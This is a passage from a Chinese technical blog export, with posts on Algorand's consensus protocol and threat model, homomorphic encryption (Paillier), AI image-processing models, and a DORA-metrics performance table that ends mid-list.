<li>节点可以自由地随时加入网络，而不需要申请。网络中每个节点通过一个公钥地址(同时也是钱包地址)表示，对于新加入的节点地址，只有被网络中其他节点转账成功(即钱包余额大于0)后，才可以参与到网络中的区块共识。</li>
<li>攻击者也是动态变化的(诚实节点随时可能变为攻击者)。</li>
</ol>
<h3 id="3-用户和交易特征"><a href="#3-用户和交易特征" class="headerlink" title="3. 用户和交易特征"></a>3. 用户和交易特征</h3><p>Algorand是一个公有链系统。用户(或者节点)加入Algorand不需要事先申请，可以随时加入。Algorand对用户数量也没有任何限制。每个用户持有多个公钥。每个公钥均是一个电子签名机制的一部分，也就是有一个与之对应的私钥。每个公钥对应着一定数量的货币。每笔交易实际上是一个电子签名，该电子签名将一定数量的货币从某一个公钥转移给另一个公钥，并用前一个公钥对应的私钥进行加密。不难看出，Algorand的这些设计，与比特币是一样的。</p>
<p>Algorand要求系统中2/3的货币由诚实用户掌握。诚实用户的含义是：其行为遵守有关指引(主要指拜赞庭共识协议，见下文)，并且能完美地发送和接收消息。诚实用户以外的是恶意用户，恶意用户的行为可以任意偏离有关指引。</p>
<p>对恶意用户，Algorand假设他们由一个“敌对者”(adversary)控制。“敌对者”能发起强大攻击，包括：</p>
<ol>
<li>“敌对者”可以在任何时候瞬间地腐化任何他选中的用户，使其成为恶意用户(哪怕该用户之前是诚实用户)。</li>
<li>“敌对者”完全控制并且完美协调所有恶意用户。可以理解为，恶意用户的行为(包括发送和接收消息)完全由“敌对者”代理。</li>
<li>“敌对者”控制所有信息发送，但必须满足一点：诚实用户发出的消息能在一定时间内(该时间只与信息的存储大小有关)抵达95%的诚实用户。</li>
<li>“敌对者”几乎不可能伪造诚实用户的电子签名或者干涉诚实用户之间的通讯。</li>
</ol>
<p>目前，Algorand是一个单纯的分布式账本协议，没有引入激励机制，没有发行类似比特币的数字加密货币。Algorand中交易所用的货币是外生给定的(可以是任何法定货币或数字加密货币)，交易只影响货币在不同用户之间的分配。而在比特币区块链系统中，“矿工”构建了被公共账本接受的区块后，就会得到系统给予的一定数量的比特币作为奖励。</p>
<h3 id="4-网络通讯"><a href="#4-网络通讯" class="headerlink" title="4. 网络通讯"></a>4. 网络通讯</h3><p>与比特币区块链系统一样，Algorand假设用户之间的通讯采取“点对点传言”模式(peer-to-peer gossip)：当某一用户传播一条消息后，第一次收到这条消息的用户随机并且独立地选择他的一些“邻居”，并将消息传给“邻居”们。当没有用户是第一次收到这条消息时，这条消息的传播就终止了。</p>
<p>Algorand对网络通讯的要求是：对任意大于95%的可及性参数(reachability)ρ和消息的存储大小参数μ，总存在一个时间参数λ(λ只与ρ和μ有关)，使得一个诚实用户发出的存储大小为μ的消息，在经过λ长时间后，至少被超过ρ的诚实用户接收。</p>
<h3 id="5-密码抽签（cryptographic-sortition）"><a href="#5-密码抽签（cryptographic-sortition）" class="headerlink" title="5. 密码抽签（cryptographic sortition）"></a>5. 密码抽签（cryptographic sortition）</h3><p>密码抽签是Algorand的关键创新，也是其得名的由来，其要点如下：</p>
<p>首先，Algorand创建并不断更新一个独立参数，称为“种子”。“种子”参数不仅不可能被“敌对者”预测，也不能被其操纵。</p>
<p>其次，在BA每次循环中，Algorand基于当前 “种子”参数构建并公布一个随机算法(也被称为可验证的随机函数—verifiable random functions，见下文)。该随机算法中的一个关键参数是用户的私钥，这个私钥只有用户本人才知道。</p>
<p>接着，每个用户使用自己的私钥运行系统公布的随机算法，得到自己的凭证(credential)。凭证值满足一定条件的用户就是这一轮的verifiers。verifiers组装一个新区块并连同自己的凭证一起对外发出。其中，在第一个子步骤中凭证值最小的那个verifier的地位比较特殊，称为leader。</p>
<p>最后，所有verifiers基于leader组装的新区块运行拜赞庭协议BA。在BA的每次循环中的每一个子步骤中，被选中的verifier都是不同的。这样能有效防止验证权力集中在某些用户手中，避免“敌对者”通过腐化这些用户来攻击区块链。</p>
<h3 id="6-共识机制"><a href="#6-共识机制" class="headerlink" title="6. 共识机制"></a>6. 共识机制</h3><p>Algorand中，verifier用户(仅指被系统随机挑中作为verifier的用户)通过一个BFT协议(由Micali教授开发，称为BA)对新区块达成共识。BA执行起来非常快。大致言之，BA每次循环有3个子步骤，在每次循环后均有1/3以上的概率能达成共识。一旦verifier对某一个新区块达成共识，超过一半的“验证者”再用自己的私钥对该区块进行电子签名，相当于认证，该区块就开始在Algorand网络中传播。</p>
<p>BA的一个重要特征是：在点对点网络通讯下，BA的参与者可更换—player-replaceable。也就是，BA每次循环的每一个子步骤均可由全新的、独立随机选择的参与者来执行。在这种情况下，BA仍能正确、有效地达成共识。假设有上百万的用户，BA每次循环的每一个子步骤的参与者可以完全不一样，而且每一批参与者都无法确定下一批参与者是谁，从而无法串谋。</p>
<h3 id="7-可能的攻击："><a href="#7-可能的攻击：" class="headerlink" title="7. 可能的攻击："></a>7. 可能的攻击：</h3><ol>
<li><p>尽管可以通过对上一个区块的哈希计算来确定构建下一个区块的leader节点和verifier节点，但是由于哈希函数自身的性质，攻击节点只需要在区块中添加一些微小的改动就可以很大影响下一个区块的leader节点的选择，从而破坏leader／verifier的随机性。为保证完全随机，在区块中引入block quantity，Qr(r为第r个块)，一个区块的Qr值只有在当前区块的leader在整个网络中被揭晓时才能最终确认，从而使攻击者无法事先攻击。</p>
</li>
<li><p>即使leader／verifier的选择是完全随机的，攻击者也有可能在leader／verifier被揭晓的同时，马上攻击这些节点，从而控制leader/verifier。为解决这个问题，采用的方案是设计多个潜在的leader，并且每个潜在leader都独立完成区块的构建，然后每个潜在leader都将自己的认证信息，构建的区块一起发送到网络中，通过共识算法选定真正的leader。由于在真正leader的身份在被揭晓之前，网络已经完成了区块数据的广播，即使攻击者攻陷了真正的leader也无法改变区块的数据。</p>
</li>
<li><p>算法中，区块生成都需要经过若干步骤，如果在算法执行过程中verifier节点被攻击，比如网络被断开，可能造成算法无法持续执行下去，从而造成整个区块无法确认，整个网络被停滞。而且，也无法要求每个节点都7x24在线，始终为整个网络进行服务。因此设计算法支持player-replaceable，从而使任何节点都可以随时被其他节点接管。</p>
</li>
</ol>
<h3 id="8-具体算法"><a href="#8-具体算法" class="headerlink" title="8. 具体算法"></a>8. 具体算法</h3><h4 id="8-1-选出verifier和leader"><a href="#8-1-选出verifier和leader" class="headerlink" title="8.1. 选出verifier和leader"></a>8.1. 选出verifier和leader</h4><ol>
<li>系统创建并不断更新一个独立参数，称为“种子”,记为Q ^{r-1} 。第r轮的种子的参数是256位长度的字符串，入参是第r-k轮结束后活跃用户的公钥集合，记为PK^{r-k}。k被称为回溯参数或安全参数，比如=1，表示上一轮结束后的用户集合。上面2个参数属于公共知识。</li>
<li>基于当前 “种子”构建并公布一个随机算法，称为可验证的随机函数(verifiable random functions)。该随机算法中的一个关键参数是用户的私钥，这个私钥只有用户本人才知道。</li>
<li>每个用户使用自己的私钥对“种子”进行签名，用函数SIGi来表示，用它作为参数，运行系统公布的随机算法，用函数H()来表示，得到自己的凭证(credential)= H(SIGi(r,1,Q^{r-1}))(函数SIGi有多个输入参数时，表示将这些参数简单串联后再进行电子签名)。<br> 3.1. 凭证是一个近乎随机的、由0和1组成的长度为256的字符串，并且不同用户的凭证几乎不可能相同；<br> 3.2. 由凭证构建的2进制小数0.H(SIGi(r,1,Q^{r-1}))，也就是将凭证字符串写到小数点后在0和1之间均匀分布。</li>
<li>凭证值满足一定条件的用户就是这一轮的验证者verifiers。<br> 4.1. 条件是：对0和1之间的一个数，0.H(SIGi(r,1,Q^{r-1}))≤p发生的概率为p，称所有满足此条件的用户为verifiers。<br> 4.2. 有1-10^{-18}的概率保证在所有verifiers中，至少有一个是诚实的。</li>
<li>verifiers组装一个新区块并连同自己的凭证一起对外发出。第r轮第s步(s&gt;1)的verifier的产生程序与上文类似。其中，在第一个子步骤中凭证值最小(按字典方面排序)的那个verifier的地位比较特殊，称为leader。</li>
<li>所有verifiers基于leader组装的新区块运行拜占庭协议BA。</li>
<li>在BA的每次循环中的每一个子步骤中，被选中的“验证者”都是不同的。这样能有效防止验证权力集中在某些用户手中，避免“敌对者”通过腐化这些用户来攻击区块链。</li>
</ol>
<h4 id="8-2-种子seed的更新"><a href="#8-2-种子seed的更新" class="headerlink" title="8.2. 种子seed的更新"></a>8.2. 种子seed的更新</h4><p>用Br表示第轮结束后，拜占庭协议BA输出的区块。</p>
<p>“种子”的更新过程是：<br>Q^r =H(SIGlr(Q^{r-1}，r)), 如果B^r不是空区块。<br>Q^r =H(Q^{r-1}，r）, 如果B^r是空区块。</p>
<p>如果Algorand在第r轮受到了“敌对者”攻击，B^r可能是空的。</p>
<h4 id="8-3-Algorand的BFT实现，即BA"><a href="#8-3-Algorand的BFT实现，即BA" class="headerlink" title="8.3. Algorand的BFT实现，即BA"></a>8.3. Algorand的BFT实现，即BA</h4><p>拜占庭协议BA相当于一个两阶段的投票机制。</p>
<ul>
<li>第一阶段，verifiers对其收到的候选区块(为控制通讯成本，实际上用的是候选区块的哈希摘要)运行分级共识协议(graded consensus), 选出verifiers共识最多的候选区块。</li>
<li>第二阶段，verifiers对第一阶段选出的候选区块，运行二元拜占庭协议(binary Byzantine Agreement)，即要么接受它，要么接受空区块。需要强调的，在每一阶段中的每一个子步骤，Algorand可能使用完全不同的verifiers。</li>
</ul>
<p>以下为叙述方便，假设：</p>
<ul>
<li>系统处在第r轮；</li>
<li>每一个子步骤都选出n名verifiers，其中恶意verifiers不超过t，并且n≥3t+1(也就是诚实“验证者”占比在2/3以上)。另外，引入计数函数 si(v)表示在第s步“验证者” i 收到的消息v的次数(来自同一发送人的只能算1次)。<h4 id="3-1-第一阶段：分级共识协议"><a href="#3-1-第一阶段：分级共识协议" class="headerlink" title="3.1. 第一阶段：分级共识协议"></a>3.1. 第一阶段：分级共识协议</h4>运行密码抽签程序，选出“领导者” lr 和这一步的“验证者”verifiers。用vi表示“验证者”i收到的并且他认识是来自“领导者”lr的候选区块。</li>
</ul>
<p>vir不一定等于“领导者”lr构建的候选区块：</p>
<ul>
<li>“验证者” i辨认 “领导者” 的方法是从他收到的所有“验证者”凭证中找出按字典排序最小者。但因为网络通讯原因，“领导者”lr发出的信息可能没有到达“验证者”i处。</li>
<li>“领导者”lr正好被“敌对者”腐化，对不同“验证者”发出不同的候选区块。</li>
<li>“验证者”i本身可能是恶意的。</li>
</ul>
<ol>
<li> “验证者”i将收到的vi广播给其他用户。广播正确的vi代表他告诉其他验证者他同意该vi。</li>
<li>当且仅当“验证者”i在步骤2中收到消息x的次数超过了2t+1次（即 2i(x)≥2t+1），他将消息x发给其他用户。“验证者”i按以下规则输出(vi,gi)：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果存在x使得#3i(x)≥2t+1，则, </span><br><span class="line">vi&#x3D;x, gi&#x3D;2；&#x2F;&#x2F;2轮都投票成功 如果x存在使得#3i(x)≥t+1，则, </span><br><span class="line">vi&#x3D;x, gi&#x3D;1；&#x2F;&#x2F;只有1轮投票成功 否则, </span><br><span class="line">vi&#x3D;Ø, gi&#x3D;1，其中Ø代表空区块。</span><br></pre></td></tr></table></figure>
 含义是：</li>
</ol>
<ul>
<li>如果存在诚实“验证者”i，使得,gi=2，那么对任意其他“验证者”j，必有gj≥1,vj=vi。此时所有诚实“验证者”输出的候选区块是一样的。当然，如果一开始的“验证者”收到的候选区块都是v，那么最后一批“验证者”输出的也将都是v。</li>
<li>对所有的诚实“验证者”i，gi≤1，并且他们输出的候选区块不一定相同。<h4 id="3-2-第二阶段：二元拜占庭协议"><a href="#3-2-第二阶段：二元拜占庭协议" class="headerlink" title="3.2. 第二阶段：二元拜占庭协议"></a>3.2. 第二阶段：二元拜占庭协议</h4>基于分级共识协议的输出{(vi,gi):i=1,2,K……n}对每个诚实“验证者”赋值：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果gi&#x3D;2，那么bi&#x3D;0；</span><br><span class="line">其他情况，bi&#x3D;1。</span><br></pre></td></tr></table></figure>
  这些bi就是二元拜占庭协议的输入。</li>
</ul>
<ol>
<li>第一步“验证者”i发出bi。<ul>
<li>如果#1i(0)≥2t+1，那么“验证者”i设定bi=0，输出outi=0，并停止执行协议（也可以认为他以后将一直发出bi=0）；</li>
<li>如果#1i(1)≥2t+1，那么“验证者”i设定bi=1；否则，“验证者”i设定bi=0。</li>
</ul>
</li>
<li>第二步“验证者”i发出bi。<ul>
<li>如果#2i(1)≥2t+1，那么“验证者”i设定bi=1，输出outi=1，并停止执行协议（也可以认为他以后将一直发出bi=1）；</li>
<li>如果#2i(0)≥2t+1，那么“验证者”i设定bi=0；否则，“验证者”i设定bi=1。</li>
</ul>
</li>
<li>第三步“验证者”i发出bi和SIGi(Qr-1,rj)。<ul>
<li>如果#3i(0)≥2t+1，那么“验证者”i设定bi=0；</li>
<li>如果#3i(1)≥2t+1，那么“验证者”i设定bi=1；</li>
<li>否则，用Si表示所有给“验证者”i发送消息的其他“验证者”集合。</li>
</ul>
</li>
</ol>
<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><ul>
<li>algorand已经成功实施了1000个虚机节点，模拟了500,000用户数量。</li>
<li>algorand的TPS性能是比特币的125倍，按照论文中给出的数据，每小时可以共识的交易是750M字节每小时，计算一下(按照每笔交易长度100字节计算)：750 1024 1024/60/60/100=2184.5 TPS，考虑到实际环境的运行，估计可以达到1000TPS左右。</li>
</ul>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>同态加密使用体验</title>
    <url>/2021/08/20/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<h3 id="什么是同态加密"><a href="#什么是同态加密" class="headerlink" title="什么是同态加密"></a>什么是同态加密</h3><p>虽然同态加密即使现在听起来也很陌生，但是其实这个概念来自 1978 年，由 RSA 算法的发明者的 R 和 A 以及 Dertouzos 提出。具体的定义如下：</p>
<blockquote>
<p>A way to delegate processing of your data, without giving away access to it.</p>
</blockquote>
<p>翻译成人话就是传统的加密方法和数据处理方法是互斥的，比如我需要计算两个数字的和（1 和 2），如果加密了之后，就无法对密文进行计算；如果想要进行计算，就必须知道这两个数字是 1 和 2。如果数据拥有方和计算方是同一方，那么知道 1 和 2 没啥问题；但如果数据拥有方和计算方并非同一方，并且数据拥有方还不想让计算方知道这两个数字是 1 和 2，这个时候就是同态加密发挥作用的时候了。</p>
<p>同态加密将数据的处理和数据本身解耦了：计算方拿到的是加密之后的密文，但是依然可以相加，相加之后把结果告诉数据拥有方，最终数据拥有方解密就可以知道最终的计算结果。</p>
<p>同态加密的这个特点使得云服务厂商非常在意，因为这一举解决了用户担心云服务厂商窃取数据的担心（因为加密了除了计算没法做其他事情），并且因为加密计算本身耗费更多计算资源，还可以变相提高营收。</p>
<p>总结一下：同态加密使得数据可以在加密的状态下进行计算，至于支持什么计算，如何进行计算，我们接下来继续讲。</p>
<h3 id="同态加密步骤"><a href="#同态加密步骤" class="headerlink" title="同态加密步骤"></a>同态加密步骤</h3><ol>
<li>在本地生成用来加密数据的 Key</li>
<li>用 Key 和 Encrypt 算法加密本地的数据，记为 <code>EncData = Encrypt(Key, Data)</code></li>
<li>告诉云平台/区块链平台需要如何计算数据，记为函数 <code>F()</code></li>
<li>云平台/区块链平台进行计算 Evaluate，即 <code>Evaluate(F(), EncData) = Encrypt(Key, F(Data))</code>，记为 <code>ProEncData</code></li>
<li>平台将 <code>ProEncData</code> 发回给到我</li>
<li>我用密钥进行解密 Decrypt，得到 <code>F(Data) = Decrypt(Key, ProEncData)</code>，也就是最终结果</li>
</ol>
<p>在以上六个步骤中，至少有四个函数是必须的：</p>
<ol>
<li>生成密钥的函数：本地执行，生成密钥</li>
<li>Encrypt 函数：本地执行，加密数据，加密之后的数据不会暴露源数据的信息</li>
<li>Evaluate 函数：用来执行用户给定的计算函数 <code>F()</code>，是唯一由云平台运行的函数</li>
<li>Decrypt 函数：本地执行，解密数据</li>
</ol>
<p>根据支持的 <code>F()</code> 的不同，同态加密分成了两类：</p>
<ol>
<li>Fully Homomorphic Encryption, FHE：这种方式下，任何 <code>F()</code> 都可以，只要这个算法能够被计算机实现即可。不过这个计算开销非常大，目前暂无实际应用。</li>
<li>Somewhat Homomorphic Encryption, SWHE：这种方式下，只支持某些特定的<code>F()</code> （比如只支持加法/乘法，并且只能执行有限次数）。这个方案有比较大的限制，但也因此计算开销较小，已经可以在实际中使用<ol>
<li>乘法：RSA, Elgamal</li>
<li>加法：Paillier</li>
</ol>
</li>
</ol>
<p>接下来我们会详细看看 Paillier 算法和 RSA 算法，对加法同态和乘法同态有更加深入的理解。</p>
<h3 id="Paillier-算法"><a href="#Paillier-算法" class="headerlink" title="Paillier 算法"></a><a href="https://github.com/WillZhuang/gomorph">Paillier 算法</a></h3><p>总共有如下几个步骤：</p>
<ol>
<li>随机选择两个质数 p 和 q 满足 |p|=|q|=τ，这个条件保证了 p 和 q 的长度相等。</li>
<li>计算 N=pq 和 λ=lcm(p−1,q−1)，注：lcm 表示最小公倍数</li>
<li>随机选择 g∈Z∗,N2，满足 gcd(L(gλmodN2),N)=1gcd(L(gλmodN2),N)=1，注：gcd 表示最大公约数；Z 表示整数，下标表示该整数集合里有多少个元素；L(x)=x−1NL(x)=x−1N</li>
<li>公钥为 (N,g)(N,g)</li>
<li>私钥为 λ</li>
</ol>
<p>参考项目：<br><a href="https://github.com/apple/swift-homomorphic-encryption">https://github.com/apple/swift-homomorphic-encryption</a><br>苹果公司表示，它正在使用同态加密技术进行实时来电者身份验证查询，用以支持来电者识别和垃圾电话拦截服务。这项技术允许苹果通过向服务器发送加密的查询，请求获取电话号码的相关信息，而服务器无需知道或存储电话号码。<br>苹果公司表示，典型的同态加密工作流可能是这样的：</p>
<ul>
<li>客户端加密敏感数据，并将结果发送给服务器。</li>
<li>服务器在不了解任何解密内容的情况下，对收到的密文进行必要的计算，可能还会结合服务器自身的明文输入。</li>
<li>服务器将计算后的密文响应发送给客户端。</li>
<li>客户端对收到的响应进行解密。<br>Swift 实现集成了 Brakerski-Fan-Vercauteren（BFV）同态加密方案，这一方案具备抵御量子计算攻击的能力。</li>
</ul>
<p><a href="https://github.com/homenc/HElib">https://github.com/homenc/HElib</a><br>IBM 提供的 HElib目前不再进行积极的开发，尽管还有一些未解决的问题，它现在处于“维护模式”，主要的工作是修复安全漏洞。</p>
<p><a href="https://github.com/microsoft/SEAL">https://github.com/microsoft/SEAL</a><br>至于微软的 SEAL 库，自 2018 年以来也都没有与发布相关的新闻，尽管其 GitHub 代码库偶尔还会有一些更新。</p>
]]></content>
      <tags>
        <tag>MPC</tag>
      </tags>
  </entry>
  <entry>
    <title>图片处理中的人工智能模型</title>
    <url>/2024/06/21/%E5%9B%BE%E7%89%87%E5%A4%84%E7%90%86%E4%B8%AD%E7%9A%84%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E6%A8%A1%E5%9E%8B%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<p>图片处理中的人工智能的分类有哪些：</p>
<ol>
<li><p><strong>图像识别与分类</strong>：<br> CLIP：<a href="https://github.com/openai/CLIP">https://github.com/openai/CLIP</a> 根据图像预测最相关的文本片段，提取图像的特征信息。<br> ViLT (Vision-and-Language Transformer)：<a href="https://github.com/dandelin/vilt">ViLT</a> 模型主要用于多模态任务，包括视觉问答（Visual Question Answering）、图像文本匹配（Image-Text Matching）、图像字幕生成（Image Captioning）等任务。<br> LAVIS：<a href="https://github.com/salesforce/LAVIS">https://github.com/salesforce/LAVIS</a> 是ALBEF，BLIP，CLIP，ALPRO，VGD-GPT等算法模型的集于一身的框架。<br>• 目标检测：识别并定位图像中的多个目标物体，如行人检测、车辆识别等。<br>• 图像分类：将整幅图像归类到预定义的类别中，如识别猫狗、区分不同种类的花卉等。<br>• 面部识别：识别和验证图像中的人脸，用于安全监控和身份验证。</p>
</li>
<li><p>图像生成与编辑：<br>• 生成对抗网络（GANs）：用于生成逼真的图像，如DeepFake、图像增强、无中生有的图像生成。<br>• 图像修复与上色：修复破损图像，给黑白图像上色，使其恢复到彩色图像。<br>• 风格迁移：将一种艺术风格应用到另一张图像上，如把照片变成梵高风格的画作。</p>
</li>
<li><p><strong>图像分割</strong>：<br> 🚀 detectron2：<a href="https://github.com/facebookresearch/detectron2">https://github.com/facebookresearch/detectron2</a> 用于物体检测、图像分割和其他视觉识别任务的平台。<br> 可以配置的算法：</p>
<ol>
<li>Mask R-CNN：<a href="https://github.com/matterport/Mask_RCNN">Mask R-CNN</a> 是由 Facebook AI Research (FAIR) 团队提出的，用于目标检测和实例分割的模型。它在 Faster R-CNN 的基础上添加了一个分支，用于预测每个 ROI 的分割掩码。</li>
<li>EfficientDet：<a href="https://github.com/google/automl/tree/master/efficientdet">EfficientDet</a> 是由 Google 的 AutoML 团队提出的，基于 EfficientNet 的轻量级且高效的目标检测模型。它在多个目标检测基准测试中表现优异。</li>
<li>Faster R-CNN：<a href="https://github.com/rbgirshick/py-faster-rcnn">Faster R-CNN</a> 是基于区域提议网络（RPN）的目标检测模型，能够快速地在图像中检测出目标物体。</li>
<li>RetinaNet：<a href="https://github.com/fizyr/keras-retinanet">RetinaNet</a> 单阶段目标检测模型，采用 Focal Loss 解决正负样本不平衡问题，能够在精度和速度上取得良好的平衡。<br>🚀 YOLOv11 (history v8)：<a href="https://github.com/ultralytics/ultralytics">https://github.com/ultralytics/ultralytics</a> 一个物体检测和图像分割的算法。Ultralytics 提供了完整的框架，用于训练、评估和部署 YOLOv8 模型。这个框架包括丰富的工具和接口，使用户可以方便地进行数据处理、模型训练和推理。<br>DINO：<a href="https://github.com/IDEA-Research/DINO">https://github.com/IDEA-Research/DINO</a> This is the official implementation of the paper “<a href="https://arxiv.org/abs/2203.03605">DINO: DETR with Improved DeNoising Anchor Boxes for End-to-End Object Detection</a>“. 一种物体检测和图像分割模型的算法及其实现。<br>• 语义分割：将图像划分为多个语义区域，每个区域代表一个类别，如天空、道路、建筑物等。<br>• <strong>实例分割</strong>：不仅区分出不同的物体类别，还区分出同一类别的不同实例。</li>
</ol>
</li>
<li><p>图像增强：<br>• 图像放大：通过增加图像的分辨率，使图像更加清晰，如将低分辨率的监控图像转换为高清图像。<br>• 去噪：减少图像中的噪声，使图像更加清晰。<br>• 去模糊：减少图像中的模糊效果，提高图像清晰度。<br>• 增强对比度：提升图像的对比度，使图像更加鲜明。</p>
</li>
<li><p>医学影像处理：<br>• 医学影像分析：用于分析医学影像，如CT、MRI，帮助医生诊断疾病。<br>• 自动分割和标注：自动识别并标注医学影像中的重要器官或病灶区域。</p>
</li>
<li><p>计算机视觉任务：<br>• 自动驾驶：通过图像处理技术识别道路标志、行人、车辆等，辅助或实现自动驾驶。<br>• 视觉导航：用于机器人导航，通过处理图像数据识别路径和障碍物。</p>
</li>
<li><p>增强现实与虚拟现实（AR/VR）：<br>• 环境识别与跟踪：识别和跟踪用户周围的物体和环境，用于增强现实应用。<br>• 虚拟物体嵌入：将虚拟物体嵌入真实场景中，实现虚实结合的效果。</p>
</li>
</ol>
<p>最后请出 the world’s biggest computer vision library — OpenCV <a href="https://opencv.org/">https://opencv.org/</a>, <a href="https://github.com/opencv/opencv">https://github.com/opencv/opencv</a></p>
]]></content>
      <tags>
        <tag>AI</tag>
        <tag>图片处理</tag>
      </tags>
  </entry>
  <entry>
    <title>基于DORA指标体系的绩效管理</title>
    <url>/2025/03/29/%E5%9F%BA%E4%BA%8EDORA%E6%8C%87%E6%A0%87%E4%BD%93%E7%B3%BB%E7%9A%84%E7%BB%A9%E6%95%88%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h2 id="一、战略层（DORA-Metrics）"><a href="#一、战略层（DORA-Metrics）" class="headerlink" title="一、战略层（DORA Metrics）"></a>一、战略层（DORA Metrics）</h2><table>
<thead>
<tr>
<th>指标</th>
<th>描述</th>
<th>目标值</th>
</tr>
</thead>
<tbody><tr>
<td>部署频率（Deployment Frequency）</td>
<td>每月部署到生产环境的次数</td>
<td>≥ 每周一次</td>
</tr>
<tr>
<td>变更前置时间（Lead Time for Changes）</td>
<td>从代码提交到生产环境部署的平均时间</td>
<td>≤ 1周</td>
</tr>
<tr>
<td>变更失败率（Change Failure Rate）</td>
<td>生产环境变更导致事故的比例</td>
<td>≤ 5%</td>
</tr>
<tr>
<td>平均恢复时间（Mean Time to Restore，MTTR）</td>
<td>故障发生到修复完成的平均时长</td>
<td>≤ 2小时</td>
</tr>
</tbody></table>
<h2 id="二、执行层（精细化指标体系）"><a href="#二、执行层（精细化指标体系）" class="headerlink" title="二、执行层（精细化指标体系）"></a>二、执行层（精细化指标体系）</h2><h3 id="（一）研发阶段（Development）"><a href="#（一）研发阶段（Development）" class="headerlink" title="（一）研发阶段（Development）"></a>（一）研发阶段（Development）</h3><table>
<thead>
<tr>
<th>指标</th>
<th>描述</th>
<th>目标值</th>
</tr>
</thead>
<tbody><tr>
<td>单元测试覆盖率</td>
<td>单元测试代码覆盖率</td>
<td>≥80%</td>
</tr>
<tr>
<td>代码审查一次通过率</td>
<td>首次通过代码审查比例</td>
<td>≥85%</td>
</tr>
<tr>
<td>技术债务</td>
<td>SonarQube技术债务评分</td>
<td>≤ 技术债务比例15%</td>
</tr>
<tr>
<td>敏捷迭代按时交付率</td>
<td>Sprint内任务完成率</td>
<td>≥90%</td>
</tr>
</tbody></table>
<h3 id="（二）部署阶段（Deployment）"><a href="#（二）部署阶段（Deployment）" class="headerlink" title="（二）部署阶段（Deployment）"></a>（二）部署阶段（Deployment）</h3><table>
<thead>
<tr>
<th>指标</th>
<th>描述</th>
<th>目标值</th>
</tr>
</thead>
<tbody><tr>
<td>首次上线成功率</td>
<td>一次性成功部署比例</td>
<td>≥95%</td>
</tr>
<tr>
<td>部署自动化覆盖率</td>
<td>CI/CD管道自动化程度</td>
<td>≥90%</td>
</tr>
<tr>
<td>平均部署周期</td>
<td>提交到上线部署的周期</td>
<td>≤2天</td>
</tr>
</tbody></table>
<h3 id="（三）运维阶段（Operation）"><a href="#（三）运维阶段（Operation）" class="headerlink" title="（三）运维阶段（Operation）"></a>（三）运维阶段（Operation）</h3><table>
<thead>
<tr>
<th>指标</th>
<th>描述</th>
<th>目标值</th>
</tr>
</thead>
<tbody><tr>
<td>系统可用率</td>
<td>系统正常运行的比例</td>
<td>≥99.95%</td>
</tr>
<tr>
<td>平均故障间隔（MTBF）</td>
<td>系统两次事故之间的平均时间</td>
<td>≥30天</td>
</tr>
<tr>
<td>自动化监控覆盖率</td>
<td>关键系统自动监控覆盖程度</td>
<td>≥95%</td>
</tr>
<tr>
<td>服务响应延迟</td>
<td>应用的99%响应延迟</td>
<td>≤500ms</td>
</tr>
</tbody></table>
<h3 id="（四）事故管理（Incident-Management）"><a href="#（四）事故管理（Incident-Management）" class="headerlink" title="（四）事故管理（Incident Management）"></a>（四）事故管理（Incident Management）</h3><table>
<thead>
<tr>
<th>指标</th>
<th>描述</th>
<th>目标值</th>
</tr>
</thead>
<tbody><tr>
<td>事故响应时间</td>
<td>事故发生到首次响应的平均时间</td>
<td>≤15分钟</td>
</tr>
<tr>
<td>事故关闭时间（MTTR）</td>
<td>从事故发生到关闭的平均时间</td>
<td>≤2小时</td>
</tr>
<tr>
<td>一级事故数量</td>
<td>严重事故（P1级）发生次数</td>
<td>每月≤2次</td>
</tr>
<tr>
<td>RCA完成率</td>
<td>重大事故根因分析完成比例</td>
<td>100%</td>
</tr>
</tbody></table>
<h3 id="（五）变更管理（Change-Management）"><a href="#（五）变更管理（Change-Management）" class="headerlink" title="（五）变更管理（Change Management）"></a>（五）变更管理（Change Management）</h3><table>
<thead>
<tr>
<th>指标</th>
<th>描述</th>
<th>目标值</th>
</tr>
</thead>
<tbody><tr>
<td>变更回退率</td>
<td>需要回滚的变更比例</td>
<td>≤5%</td>
</tr>
<tr>
<td>紧急变更比例</td>
<td>紧急变更占全部变更的比例</td>
<td>≤10%</td>
</tr>
<tr>
<td>变更审批效率</td>
<td>变更申请到审批完成时间</td>
<td>≤1个工作日</td>
</tr>
</tbody></table>
<h3 id="（六）系统淘汰管理（Demise-amp-Decommission）"><a href="#（六）系统淘汰管理（Demise-amp-Decommission）" class="headerlink" title="（六）系统淘汰管理（Demise &amp; Decommission）"></a>（六）系统淘汰管理（Demise &amp; Decommission）</h3><table>
<thead>
<tr>
<th>指标</th>
<th>描述</th>
<th>目标值</th>
</tr>
</thead>
<tbody><tr>
<td>系统及时退役率</td>
<td>按计划淘汰系统的及时率</td>
<td>100%</td>
</tr>
<tr>
<td>淘汰成本控制</td>
<td>实际退役成本与计划的差异比例</td>
<td>≤10%</td>
</tr>
</tbody></table>
<h2 id="三、实施与治理模式"><a href="#三、实施与治理模式" class="headerlink" title="三、实施与治理模式"></a>三、实施与治理模式</h2><h3 id="1-报告与回顾机制"><a href="#1-报告与回顾机制" class="headerlink" title="1. 报告与回顾机制"></a>1. 报告与回顾机制</h3><ul>
<li>每季度向战略层汇报DORA指标，审视整体战略目标达成情况。</li>
<li>每月运营回顾精细化指标，针对执行偏差提出整改。</li>
<li>每周团队自查具体指标，持续改进。</li>
</ul>
<h3 id="2-技术支撑平台"><a href="#2-技术支撑平台" class="headerlink" title="2. 技术支撑平台"></a>2. 技术支撑平台</h3><ul>
<li>DevOps平台自动收集开发、测试、部署数据。</li>
<li>ITSM（如ServiceNow）跟踪事故、变更数据。</li>
<li>APM（如Prometheus/Grafana）实时监控运维指标。</li>
<li>数据可视化平台（如Power BI）集中展现指标。</li>
</ul>
<h3 id="3-组织与激励"><a href="#3-组织与激励" class="headerlink" title="3. 组织与激励"></a>3. 组织与激励</h3><ul>
<li>指标与团队绩效激励直接关联，优秀团队给予奖励。</li>
